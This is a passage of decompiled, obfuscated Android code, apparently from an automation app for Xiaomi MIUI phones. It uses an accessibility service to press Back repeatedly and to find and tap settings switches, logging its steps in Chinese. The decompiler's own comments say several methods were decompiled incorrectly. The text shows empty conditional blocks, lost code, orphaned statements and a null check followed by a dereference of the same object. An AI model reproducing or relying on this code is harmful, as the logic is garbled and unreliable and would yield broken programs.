                                    c0367a4.m212274d8("│ │ 🔙 执行第三次返回操作");
                                    c0367a4.f55106a0.performGlobalAction(1);
                                    miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0 = c0367a4;
                                    miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3 = 6;
                                    if (b81.m210571b1(1000L, miuiSteps$smartReturnToAppForAndroid9OrBelow$1) != coroutineSingletons) {
                                        zM212273d73 = c0367a4.m212273d7();
                                        c0367a4.m212274d8("│ │ 🔍 第四次检测：第三次返回后是否在应用 = " + zM212273d73);
                                        if (!zM212273d73) {
                                            c0367a4.m212274d8("│ │ ✅ 第三次返回成功，验证稳定性");
                                            miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0 = c0367a4;
                                            miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3 = 7;
                                            break;
                                        } else {
                                            c0367a4.m212274d8("│ │ 🔙 执行第四次返回操作");
                                            c0367a4.f55106a0.performGlobalAction(1);
                                            miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0 = c0367a4;
                                            miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3 = 8;
                                            if (b81.m210571b1(500L, miuiSteps$smartReturnToAppForAndroid9OrBelow$1) != coroutineSingletons) {
                                                c0367a42 = c0367a4;
                                                zM212273d74 = c0367a42.m212273d7();
                                                c0367a42.m212274d8("│ │ 🔍 第五次检测：第四次返回后是否在应用 = " + zM212273d74);
                                                if (zM212273d74) {
                                                    c0367a42.m212274d8("│ │ ⚠️ 四次返回操作都未成功回到应用");
                                                    c0367a42.m212274d8("│ └──────────────────────────────────────────────────────");
                                                    return Boolean.FALSE;
                                                }
                                                c0367a42.m212274d8("│ │ ✅ 第四次返回成功，已回到应用页面");
                                                c0367a42.m212274d8("│ └──────────────────────────────────────────────────────");
                                                return Boolean.TRUE;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                c0367a4 = miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0;
                kg1.m213544f4(obj);
                if (!c0367a4.m212273d7()) {
                }
                break;
            case 2:
                c0367a4 = miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0;
                kg1.m213544f4(obj);
                zM212273d7 = c0367a4.m212273d7();
                c0367a4.m212274d8("│ │ 🔍 第二次检测：第一次返回后是否在应用 = " + zM212273d7);
                if (!zM212273d7) {
                }
                return coroutineSingletons;
            case 3:
                c0367a4 = miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0;
                kg1.m213544f4(obj);
                if (c0367a4.m212273d7()) {
                    c0367a4.m212274d8("│ │ ✅ 第一次返回成功且状态稳定");
                    c0367a4.m212274d8("│ └──────────────────────────────────────────────────────");
                    return Boolean.TRUE;
                }
                c0367a4.m212274d8("│ │ ⚠️ 第一次返回成功但状态不稳定，继续返回");
                c0367a4.m212274d8("│ │ 🔙 执行第二次返回操作");
                c0367a4.f55106a0.performGlobalAction(1);
                miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0 = c0367a4;
                miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3 = 4;
                if (b81.m210571b1(1000L, miuiSteps$smartReturnToAppForAndroid9OrBelow$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 4:
                c0367a4 = miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0;
                kg1.m213544f4(obj);
                zM212273d72 = c0367a4.m212273d7();
                c0367a4.m212274d8("│ │ 🔍 第三次检测：第二次返回后是否在应用 = " + zM212273d72);
                if (!zM212273d72) {
                }
                return coroutineSingletons;
            case 5:
                c0367a4 = miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0;
                kg1.m213544f4(obj);
                if (c0367a4.m212273d7()) {
                    c0367a4.m212274d8("│ │ ✅ 第二次返回成功且状态稳定");
                    c0367a4.m212274d8("│ └──────────────────────────────────────────────────────");
                    return Boolean.TRUE;
                }
                c0367a4.m212274d8("│ │ ⚠️ 第二次返回成功但状态不稳定，继续返回");
                c0367a4.m212274d8("│ │ 🔙 执行第三次返回操作");
                c0367a4.f55106a0.performGlobalAction(1);
                miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0 = c0367a4;
                miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3 = 6;
                if (b81.m210571b1(1000L, miuiSteps$smartReturnToAppForAndroid9OrBelow$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 6:
                c0367a4 = miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0;
                kg1.m213544f4(obj);
                zM212273d73 = c0367a4.m212273d7();
                c0367a4.m212274d8("│ │ 🔍 第四次检测：第三次返回后是否在应用 = " + zM212273d73);
                if (!zM212273d73) {
                }
                return coroutineSingletons;
            case 7:
                c0367a4 = miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0;
                kg1.m213544f4(obj);
                if (c0367a4.m212273d7()) {
                    c0367a4.m212274d8("│ │ ✅ 第三次返回成功且状态稳定");
                    c0367a4.m212274d8("│ └──────────────────────────────────────────────────────");
                    return Boolean.TRUE;
                }
                c0367a4.m212274d8("│ │ ⚠️ 第三次返回成功但状态不稳定，继续返回");
                c0367a4.m212274d8("│ │ 🔙 执行第四次返回操作");
                c0367a4.f55106a0.performGlobalAction(1);
                miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0 = c0367a4;
                miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54459a3 = 8;
                if (b81.m210571b1(500L, miuiSteps$smartReturnToAppForAndroid9OrBelow$1) != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 8:
                c0367a42 = miuiSteps$smartReturnToAppForAndroid9OrBelow$1.f54456a0;
                kg1.m213544f4(obj);
                zM212273d74 = c0367a42.m212273d7();
                c0367a42.m212274d8("│ │ 🔍 第五次检测：第四次返回后是否在应用 = " + zM212273d74);
                if (zM212273d74) {
                }
                break;
            default:
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:100:0x01e5, code lost:
    
        r0.recycle();
     */
    /* JADX WARN: Code restructure failed: missing block: B:101:0x01ea, code lost:
    
        return java.lang.Boolean.TRUE;
     */
    /* JADX WARN: Code restructure failed: missing block: B:107:0x022a, code lost:
    
        if (p000.b81.m210571b1(50, r4) == r5) goto L108;
     */
    /* JADX WARN: Code restructure failed: missing block: B:96:0x01c8, code lost:
    
        r14.m212274d8("│ │   [ViewId开关] ✅ 状态已变更为: ".concat("OFF"));
        r2 = r10.iterator();
     */
    /* JADX WARN: Code restructure failed: missing block: B:98:0x01d9, code lost:
    
        if (r2.hasNext() == false) goto L129;
     */
    /* JADX WARN: Code restructure failed: missing block: B:99:0x01db, code lost:
    
        ((android.view.accessibility.AccessibilityNodeInfo) r2.next()).recycle();
     */
    /* JADX WARN: Removed duplicated region for block: B:110:0x0232  */
    /* JADX WARN: Removed duplicated region for block: B:120:0x019d A[EXC_TOP_SPLITTER, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:73:0x016f  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x001b  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:107:0x022a -> B:81:0x0197). Please report as a decompilation issue!!! */
    /* renamed from: e9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212284e9(String str, String str2, ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$toggleByViewId$1 miuiSteps$toggleByViewId$1;
        AccessibilityNodeInfo rootInActiveWindow;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId;
        int i;
        AccessibilityNodeInfo next;
        int iCenterX;
        int iCenterY;
        C0367a4 c0367a4;
        String string;
        C0367a4 c0367a42;
        String str3;
        int i2;
        int i3;
        AccessibilityNodeInfo rootInActiveWindow2;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId2;
        String str4 = str;
        if (continuationImpl instanceof MiuiSteps$toggleByViewId$1) {
            miuiSteps$toggleByViewId$1 = (MiuiSteps$toggleByViewId$1) continuationImpl;
            int i4 = miuiSteps$toggleByViewId$1.f54467a7;
            if ((i4 & Integer.MIN_VALUE) != 0) {
                miuiSteps$toggleByViewId$1.f54467a7 = i4 - Integer.MIN_VALUE;
            } else {
                miuiSteps$toggleByViewId$1 = new MiuiSteps$toggleByViewId$1(this, continuationImpl);
            }
        }
        Object obj = miuiSteps$toggleByViewId$1.f54465a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i5 = miuiSteps$toggleByViewId$1.f54467a7;
        if (i5 == 0) {
            kg1.m213544f4(obj);
            m212274d8("│ │   [ViewId开关] 查找: " + str4 + ", 目标: OFF");
            try {
                rootInActiveWindow = this.f55106a0.getRootInActiveWindow();
            } catch (Exception unused) {
                rootInActiveWindow = null;
            }
            if (rootInActiveWindow == null) {
                m212274d8("│ │   [ViewId开关] ❌ 无法获取root");
                return Boolean.FALSE;
            }
            try {
                listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(str4);
            } catch (Exception e) {
                AbstractC0003a2.m45c6("│ │   [ViewId开关] ❌ 查找异常: ", e.getMessage(), this);
                listFindAccessibilityNodeInfosByViewId = null;
            }
            if (listFindAccessibilityNodeInfosByViewId == null || listFindAccessibilityNodeInfosByViewId.isEmpty()) {
                m212274d8("│ │   [ViewId开关] ❌ 未找到ViewId: " + str4);
                rootInActiveWindow.recycle();
                return Boolean.FALSE;
            }
            Iterator<AccessibilityNodeInfo> it = listFindAccessibilityNodeInfosByViewId.iterator();
            while (true) {
                i = 0;
                if (!it.hasNext()) {
                    next = null;
                    break;
                }
                next = it.next();
                if (next.isVisibleToUser()) {
                    CharSequence className = next.getClassName();
                    if (className == null || (string = className.toString()) == null) {
                        string = "";
                    }
                    if (AbstractC0779a1.m213652a5(string, AbstractC0779a1.m213684d7(str2, "."), false)) {
                        break;
                    }
                }
            }
            if (next == null) {
                m212274d8("│ │   [ViewId开关] ❌ 未找到可见的" + str2);
                Iterator<T> it2 = listFindAccessibilityNodeInfosByViewId.iterator();
                while (it2.hasNext()) {
                    ((AccessibilityNodeInfo) it2.next()).recycle();
                }
                rootInActiveWindow.recycle();
                return Boolean.FALSE;
            }
            boolean zIsChecked = next.isChecked();
            m212274d8("│ │   [ViewId开关] 当前状态: ".concat(zIsChecked ? "ON" : "OFF"));
            if (!zIsChecked) {
                m212274d8("│ │   [ViewId开关] ✅ 已是目标状态，跳过");
                Iterator<T> it3 = listFindAccessibilityNodeInfosByViewId.iterator();
                while (it3.hasNext()) {
                    ((AccessibilityNodeInfo) it3.next()).recycle();
                }
                rootInActiveWindow.recycle();
                return Boolean.TRUE;
            }
            Rect rectM24a5 = AbstractC0003a2.m24a5(next);
            iCenterX = rectM24a5.centerX();
            iCenterY = rectM24a5.centerY();
            m212274d8(AbstractC0003a2.m31b2("│ │   [ViewId开关] 点击坐标: (", iCenterX, ", ", iCenterY, ")"));
            Iterator<T> it4 = listFindAccessibilityNodeInfosByViewId.iterator();
            while (it4.hasNext()) {
                ((AccessibilityNodeInfo) it4.next()).recycle();
            }
            rootInActiveWindow.recycle();
            c0367a4 = this;
            if (i >= 2) {
            }
        } else if (i5 == 1) {
            i3 = miuiSteps$toggleByViewId$1.f54464a4;
            iCenterY = miuiSteps$toggleByViewId$1.f54463a3;
            i2 = miuiSteps$toggleByViewId$1.f54462a2;
            str3 = miuiSteps$toggleByViewId$1.f54461a1;
            c0367a42 = miuiSteps$toggleByViewId$1.f54460a0;
            kg1.m213544f4(obj);
            rootInActiveWindow2 = c0367a42.f55106a0.getRootInActiveWindow();
            if (rootInActiveWindow2 != null) {
            }
            iCenterX = i2;
            c0367a4 = c0367a42;
            i = i3 + 1;
            str4 = str3;
            if (i >= 2) {
            }
        } else {
            if (i5 != 2) {
                throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            i3 = miuiSteps$toggleByViewId$1.f54464a4;
            iCenterY = miuiSteps$toggleByViewId$1.f54463a3;
            i2 = miuiSteps$toggleByViewId$1.f54462a2;
            str3 = miuiSteps$toggleByViewId$1.f54461a1;
            c0367a42 = miuiSteps$toggleByViewId$1.f54460a0;
            kg1.m213544f4(obj);
            iCenterX = i2;
            c0367a4 = c0367a42;
            i = i3 + 1;
            str4 = str3;
            if (i >= 2) {
                c0367a4.m212277e2(iCenterX, iCenterY, 50L);
                miuiSteps$toggleByViewId$1.f54460a0 = c0367a4;
                miuiSteps$toggleByViewId$1.f54461a1 = str4;
                miuiSteps$toggleByViewId$1.f54462a2 = iCenterX;
                miuiSteps$toggleByViewId$1.f54463a3 = iCenterY;
                miuiSteps$toggleByViewId$1.f54464a4 = i;
                miuiSteps$toggleByViewId$1.f54467a7 = 1;
                if (b81.m210571b1(50L, miuiSteps$toggleByViewId$1) != coroutineSingletons) {
                    c0367a42 = c0367a4;
                    str3 = str4;
                    i2 = iCenterX;
                    i3 = i;
                    try {
                    } catch (Exception unused2) {
                        if (0 != 0) {
                        }
                    }
                    rootInActiveWindow2 = c0367a42.f55106a0.getRootInActiveWindow();
                    if (rootInActiveWindow2 != null) {
                        try {
                        } catch (Exception unused3) {
                            listFindAccessibilityNodeInfosByViewId2 = null;
                        }
                        listFindAccessibilityNodeInfosByViewId2 = rootInActiveWindow2.findAccessibilityNodeInfosByViewId(str3);
                        if (listFindAccessibilityNodeInfosByViewId2 != null && !listFindAccessibilityNodeInfosByViewId2.isEmpty()) {
                            for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByViewId2) {
                                if (accessibilityNodeInfo.isVisibleToUser() && !accessibilityNodeInfo.isChecked()) {
                                    break;
                                }
                            }
                            Iterator<T> it5 = listFindAccessibilityNodeInfosByViewId2.iterator();
                            while (it5.hasNext()) {
                                ((AccessibilityNodeInfo) it5.next()).recycle();
                            }
                        }
                        rootInActiveWindow2.recycle();
                        c0367a42.m212274d8("│ │   [ViewId开关] ⚠️ 状态未变，重试 " + (i3 + 1) + "/2");
                        miuiSteps$toggleByViewId$1.f54460a0 = c0367a42;
                        miuiSteps$toggleByViewId$1.f54461a1 = str3;
                        miuiSteps$toggleByViewId$1.f54462a2 = i2;
                        miuiSteps$toggleByViewId$1.f54463a3 = iCenterY;
                        miuiSteps$toggleByViewId$1.f54464a4 = i3;
                        miuiSteps$toggleByViewId$1.f54467a7 = 2;
                    }
                    iCenterX = i2;
                    c0367a4 = c0367a42;
                    i = i3 + 1;
                    str4 = str3;
                    if (i >= 2) {
                        c0367a4.m212274d8("│ │   [ViewId开关] ❌ 操作失败");
                        return Boolean.FALSE;
                    }
                }
                return coroutineSingletons;
            }
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:82:0x01b6  */
    /* JADX WARN: Removed duplicated region for block: B:85:0x01bf  */
    /* JADX WARN: Removed duplicated region for block: B:8:0x001c  */
    /* renamed from: f0 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212285f0(String str, boolean z, ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$toggleCheckBox$1 miuiSteps$toggleCheckBox$1;
        C0367a4 c0367a4;
        String str2;
        boolean z2;
        float f;
        float f2;
        String string;
        AccessibilityNodeInfo accessibilityNodeInfoM212265c8;
        C0367a4 c0367a42;
        C0367a4 c0367a43;
        boolean z3;
        C0367a4 c0367a44;
        String str3;
        AccessibilityNodeInfo accessibilityNodeInfoM212265c82;
        if (continuationImpl instanceof MiuiSteps$toggleCheckBox$1) {
            miuiSteps$toggleCheckBox$1 = (MiuiSteps$toggleCheckBox$1) continuationImpl;
            int i = miuiSteps$toggleCheckBox$1.f54475a7;
            if ((i & Integer.MIN_VALUE) != 0) {
                miuiSteps$toggleCheckBox$1.f54475a7 = i - Integer.MIN_VALUE;
            } else {
                miuiSteps$toggleCheckBox$1 = new MiuiSteps$toggleCheckBox$1(this, continuationImpl);
            }
        }
        MiuiSteps$toggleCheckBox$1 miuiSteps$toggleCheckBox$12 = miuiSteps$toggleCheckBox$1;
        Object obj = miuiSteps$toggleCheckBox$12.f54473a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = miuiSteps$toggleCheckBox$12.f54475a7;
        if (i2 == 0) {
            kg1.m213544f4(obj);
            m212274d8("│ │   [开关] 查找: " + str + ", 目标: " + (z ? "ON" : "OFF"));
            AccessibilityNodeInfo accessibilityNodeInfoM212266c9 = m212266c9(str);
            if (accessibilityNodeInfoM212266c9 == null) {
                AbstractC0003a2.m45c6("│ │   [开关] ❌ 未找到文本: ", str, this);
                miuiSteps$toggleCheckBox$12.f54475a7 = 1;
                Object objM212286f1 = m212286f1(str, z, miuiSteps$toggleCheckBox$12);
                if (objM212286f1 != coroutineSingletons) {
                    return objM212286f1;
                }
            } else {
                m212274d8("│ │   [开关] ✓ 找到文本节点");
                AccessibilityNodeInfo accessibilityNodeInfoM212265c83 = m212265c8(accessibilityNodeInfoM212266c9, "CheckBox");
                if (accessibilityNodeInfoM212265c83 == null) {
                    accessibilityNodeInfoM212265c83 = m212265c8(accessibilityNodeInfoM212266c9, "Switch");
                }
                if (accessibilityNodeInfoM212265c83 == null) {
                    accessibilityNodeInfoM212265c83 = m212265c8(accessibilityNodeInfoM212266c9, null);
                }
                if (accessibilityNodeInfoM212265c83 == null) {
                    m212274d8("│ │   [开关] ❌ 未找到开关控件，尝试点击文本右侧");
                    miuiSteps$toggleCheckBox$12.f54475a7 = 2;
                    Object objM212247a0 = m212247a0(accessibilityNodeInfoM212266c9, miuiSteps$toggleCheckBox$12);
                    if (objM212247a0 != coroutineSingletons) {
                        return objM212247a0;
                    }
                } else {
                    CharSequence className = accessibilityNodeInfoM212265c83.getClassName();
                    m212274d8("│ │   [开关] ✓ 找到开关: ".concat((className == null || (string = className.toString()) == null) ? "unknown" : AbstractC0779a1.m213684d7(string, ".")));
                    boolean zIsChecked = accessibilityNodeInfoM212265c83.isChecked();
                    m212274d8("│ │   [开关] 当前状态: ".concat(zIsChecked ? "ON" : "OFF"));
                    if (zIsChecked == z) {
                        m212274d8("│ │   [开关] ✅ 已是目标状态，无需操作");
                        return Boolean.TRUE;
                    }
                    Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfoM212265c83);
                    float fExactCenterX = rectM24a5.exactCenterX();
                    float fExactCenterY = rectM24a5.exactCenterY();
                    m212274d8(AbstractC0003a2.m29b0("│ │   [开关] 🎯 点击: (", fExactCenterX, ", ", fExactCenterY, ")"));
                    m212277e2(fExactCenterX, fExactCenterY, 50L);
                    miuiSteps$toggleCheckBox$12.f54468a0 = this;
                    miuiSteps$toggleCheckBox$12.f54469a1 = str;
                    miuiSteps$toggleCheckBox$12.f54470a2 = z;
                    miuiSteps$toggleCheckBox$12.f54471a3 = fExactCenterX;
                    miuiSteps$toggleCheckBox$12.f54472a4 = fExactCenterY;
                    miuiSteps$toggleCheckBox$12.f54475a7 = 3;
                    if (m212294f9(2, 100L, 500L, miuiSteps$toggleCheckBox$12) != coroutineSingletons) {
                        c0367a4 = this;
                        str2 = str;
                        z2 = z;
                        f = fExactCenterX;
                        f2 = fExactCenterY;
                    }
                }
            }
            return coroutineSingletons;
        }
        if (i2 == 1) {
            kg1.m213544f4(obj);
            return obj;
        }
        if (i2 == 2) {
            kg1.m213544f4(obj);
            return obj;
        }
        if (i2 != 3) {
            if (i2 != 4) {
                if (i2 != 5) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                z3 = miuiSteps$toggleCheckBox$12.f54470a2;
                str3 = miuiSteps$toggleCheckBox$12.f54469a1;
                c0367a44 = miuiSteps$toggleCheckBox$12.f54468a0;
                kg1.m213544f4(obj);
                AccessibilityNodeInfo accessibilityNodeInfoM212266c92 = c0367a44.m212266c9(str3);
                accessibilityNodeInfoM212265c82 = accessibilityNodeInfoM212266c92 != null ? c0367a44.m212265c8(accessibilityNodeInfoM212266c92, null) : null;
                if (accessibilityNodeInfoM212265c82 == null && accessibilityNodeInfoM212265c82.isChecked() == z3) {
                    c0367a44.m212274d8("│ │   [开关] ✅ 重试点击成功");
                    return Boolean.TRUE;
                }
                c0367a44.m212274d8("│ │   [开关] ❌ 重试失败，状态仍未改变");
                return Boolean.FALSE;
            }
            f2 = miuiSteps$toggleCheckBox$12.f54472a4;
            f = miuiSteps$toggleCheckBox$12.f54471a3;
            z2 = miuiSteps$toggleCheckBox$12.f54470a2;
            str2 = miuiSteps$toggleCheckBox$12.f54469a1;
            c0367a42 = miuiSteps$toggleCheckBox$12.f54468a0;
            kg1.m213544f4(obj);
            boolean z4 = z2;
            String str4 = str2;
            c0367a42.m212277e2(f, f2, 100L);
            miuiSteps$toggleCheckBox$12.f54468a0 = c0367a42;
            miuiSteps$toggleCheckBox$12.f54469a1 = str4;
            miuiSteps$toggleCheckBox$12.f54470a2 = z4;
            miuiSteps$toggleCheckBox$12.f54475a7 = 5;
            c0367a43 = c0367a42;
            if (c0367a43.m212294f9(2, 100L, 500L, miuiSteps$toggleCheckBox$12) != coroutineSingletons) {
                z3 = z4;
                c0367a44 = c0367a43;
                str3 = str4;
                AccessibilityNodeInfo accessibilityNodeInfoM212266c922 = c0367a44.m212266c9(str3);
                if (accessibilityNodeInfoM212266c922 != null) {
                }
                if (accessibilityNodeInfoM212265c82 == null) {
                }
                c0367a44.m212274d8("│ │   [开关] ❌ 重试失败，状态仍未改变");
                return Boolean.FALSE;
            }
            return coroutineSingletons;
        }
        f2 = miuiSteps$toggleCheckBox$12.f54472a4;
        f = miuiSteps$toggleCheckBox$12.f54471a3;
        z2 = miuiSteps$toggleCheckBox$12.f54470a2;
        str2 = miuiSteps$toggleCheckBox$12.f54469a1;
        C0367a4 c0367a45 = miuiSteps$toggleCheckBox$12.f54468a0;
        kg1.m213544f4(obj);
        c0367a4 = c0367a45;
        AccessibilityNodeInfo accessibilityNodeInfoM212266c93 = c0367a4.m212266c9(str2);
        if (accessibilityNodeInfoM212266c93 == null || (accessibilityNodeInfoM212265c8 = c0367a4.m212265c8(accessibilityNodeInfoM212266c93, null)) == null) {
            c0367a4.m212274d8("│ │   [开关] ⚠️ 点击完成（无法验证状态）");
            return Boolean.TRUE;
        }
        boolean zIsChecked2 = accessibilityNodeInfoM212265c8.isChecked();
        c0367a4.m212274d8("│ │   [开关] 验证: 新状态=".concat(zIsChecked2 ? "ON" : "OFF"));
        if (zIsChecked2 == z2) {
            c0367a4.m212274d8("│ │   [开关] ✅ 点击成功，状态已改变");
            return Boolean.TRUE;
        }
        c0367a4.m212274d8("│ │   [开关] ⚠️ 状态未改变，尝试重新点击...");
        miuiSteps$toggleCheckBox$12.f54468a0 = c0367a4;
        miuiSteps$toggleCheckBox$12.f54469a1 = str2;
        miuiSteps$toggleCheckBox$12.f54470a2 = z2;
        miuiSteps$toggleCheckBox$12.f54471a3 = f;
        miuiSteps$toggleCheckBox$12.f54472a4 = f2;
        miuiSteps$toggleCheckBox$12.f54475a7 = 4;
        if (b81.m210571b1(200L, miuiSteps$toggleCheckBox$12) != coroutineSingletons) {
            c0367a42 = c0367a4;
            boolean z42 = z2;
            String str42 = str2;
            c0367a42.m212277e2(f, f2, 100L);
            miuiSteps$toggleCheckBox$12.f54468a0 = c0367a42;
            miuiSteps$toggleCheckBox$12.f54469a1 = str42;
            miuiSteps$toggleCheckBox$12.f54470a2 = z42;
            miuiSteps$toggleCheckBox$12.f54475a7 = 5;
            c0367a43 = c0367a42;
            if (c0367a43.m212294f9(2, 100L, 500L, miuiSteps$toggleCheckBox$12) != coroutineSingletons) {
            }
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Removed duplicated region for block: B:31:0x0097  */
    /* JADX WARN: Removed duplicated region for block: B:45:0x0122  */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0013  */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:40:0x0117 -> B:62:0x0118). Please report as a decompilation issue!!! */
    /* renamed from: f1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212286f1(String str, boolean z, ContinuationImpl continuationImpl) throws Throwable {
        MiuiSteps$toggleCheckBoxByFuzzySearch$1 miuiSteps$toggleCheckBoxByFuzzySearch$1;
        AccessibilityNodeInfo rootInActiveWindow;
        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText;
        Iterator<AccessibilityNodeInfo> it;
        int i;
        C0367a4 c0367a4;
        AccessibilityNodeInfo rootInActiveWindow2;
        if (continuationImpl instanceof MiuiSteps$toggleCheckBoxByFuzzySearch$1) {
            miuiSteps$toggleCheckBoxByFuzzySearch$1 = (MiuiSteps$toggleCheckBoxByFuzzySearch$1) continuationImpl;
            int i2 = miuiSteps$toggleCheckBoxByFuzzySearch$1.f54483a7;
            if ((i2 & Integer.MIN_VALUE) != 0) {
                miuiSteps$toggleCheckBoxByFuzzySearch$1.f54483a7 = i2 - Integer.MIN_VALUE;
            } else {
                miuiSteps$toggleCheckBoxByFuzzySearch$1 = new MiuiSteps$toggleCheckBoxByFuzzySearch$1(this, continuationImpl);
            }
        }
        Object obj = miuiSteps$toggleCheckBoxByFuzzySearch$1.f54481a5;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i3 = miuiSteps$toggleCheckBoxByFuzzySearch$1.f54483a7;
        if (i3 == 0) {
            kg1.m213544f4(obj);
            m212274d8("│ │   [模糊搜索] 开始搜索: " + str);
            try {
                rootInActiveWindow = this.f55106a0.getRootInActiveWindow();
            } catch (Exception unused) {
                rootInActiveWindow = null;
            }
            if (rootInActiveWindow == null) {
                return Boolean.FALSE;
            }
            try {
                listFindAccessibilityNodeInfosByText = rootInActiveWindow.findAccessibilityNodeInfosByText(str);
            } catch (Exception unused2) {
                listFindAccessibilityNodeInfosByText = null;
            }
            if (listFindAccessibilityNodeInfosByText == null || listFindAccessibilityNodeInfosByText.isEmpty()) {
                m212274d8("│ │   [模糊搜索] ❌ 未找到任何匹配节点");
                return Boolean.FALSE;
            }
            m212274d8("│ │   [模糊搜索] 找到 " + listFindAccessibilityNodeInfosByText.size() + " 个匹配节点");
            it = listFindAccessibilityNodeInfosByText.iterator();
            i = 0;
            c0367a4 = this;
            while (it.hasNext()) {
            }
            c0367a4.m212274d8("│ │   [模糊搜索] ❌ 未能操作开关");
            return Boolean.FALSE;
        }
        if (i3 != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        int i4 = miuiSteps$toggleCheckBoxByFuzzySearch$1.f54480a4;
        z = miuiSteps$toggleCheckBoxByFuzzySearch$1.f54479a3;
        it = miuiSteps$toggleCheckBoxByFuzzySearch$1.f54478a2;
        String str2 = miuiSteps$toggleCheckBoxByFuzzySearch$1.f54477a1;
        c0367a4 = miuiSteps$toggleCheckBoxByFuzzySearch$1.f54476a0;
        kg1.m213544f4(obj);
        i = i4;
        str = str2;
        try {
        } catch (Exception unused3) {
            rootInActiveWindow2 = null;
        }
        rootInActiveWindow2 = c0367a4.f55106a0.getRootInActiveWindow();
        if (rootInActiveWindow2 != null) {
            List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByText2 = rootInActiveWindow2.findAccessibilityNodeInfosByText(str);
            if (listFindAccessibilityNodeInfosByText2 == null) {
                listFindAccessibilityNodeInfosByText2 = EmptyList.f57568a0;
            }
            for (AccessibilityNodeInfo accessibilityNodeInfo : listFindAccessibilityNodeInfosByText2) {
                t60.m214694b5(accessibilityNodeInfo, "vNode");
                AccessibilityNodeInfo accessibilityNodeInfoM212265c8 = c0367a4.m212265c8(accessibilityNodeInfo, null);
                if (accessibilityNodeInfoM212265c8 != null && accessibilityNodeInfoM212265c8.isChecked() == z) {
                    c0367a4.m212274d8("│ │   [模糊搜索] ✅ 操作成功");
                    return Boolean.TRUE;
                }
            }
        }
        while (it.hasNext()) {
            int i5 = i + 1;
            AccessibilityNodeInfo next = it.next();
            c0367a4.m212274d8("│ │   [模糊搜索] 节点" + i + ": class=" + ((Object) next.getClassName()) + ", text=" + ((Object) next.getText()));
            AccessibilityNodeInfo accessibilityNodeInfoM212265c82 = c0367a4.m212265c8(next, null);
            if (accessibilityNodeInfoM212265c82 != null) {
                c0367a4.m212274d8("│ │   [模糊搜索] 找到开关: " + ((Object) accessibilityNodeInfoM212265c82.getClassName()));
                if (accessibilityNodeInfoM212265c82.isChecked() == z) {
                    c0367a4.m212274d8("│ │   [模糊搜索] ✅ 已是目标状态");
                    return Boolean.TRUE;
                }
                Rect rectM24a5 = AbstractC0003a2.m24a5(accessibilityNodeInfoM212265c82);
                c0367a4.m212277e2(rectM24a5.exactCenterX(), rectM24a5.exactCenterY(), 50L);
                miuiSteps$toggleCheckBoxByFuzzySearch$1.f54476a0 = c0367a4;
                miuiSteps$toggleCheckBoxByFuzzySearch$1.f54477a1 = str;
                miuiSteps$toggleCheckBoxByFuzzySearch$1.f54478a2 = it;
                miuiSteps$toggleCheckBoxByFuzzySearch$1.f54479a3 = z;
                miuiSteps$toggleCheckBoxByFuzzySearch$1.f54480a4 = i5;
                miuiSteps$toggleCheckBoxByFuzzySearch$1.f54483a7 = 1;
                if (b81.m210571b1(150L, miuiSteps$toggleCheckBoxByFuzzySearch$1) == coroutineSingletons) {
                    return coroutineSingletons;
                }
                i = i5;
                rootInActiveWindow2 = c0367a4.f55106a0.getRootInActiveWindow();
                if (rootInActiveWindow2 != null) {
                }
                while (it.hasNext()) {
                }
            } else {
                i = i5;
            }
        }
        c0367a4.m212274d8("│ │   [模糊搜索] ❌ 未能操作开关");
        return Boolean.FALSE;
    }

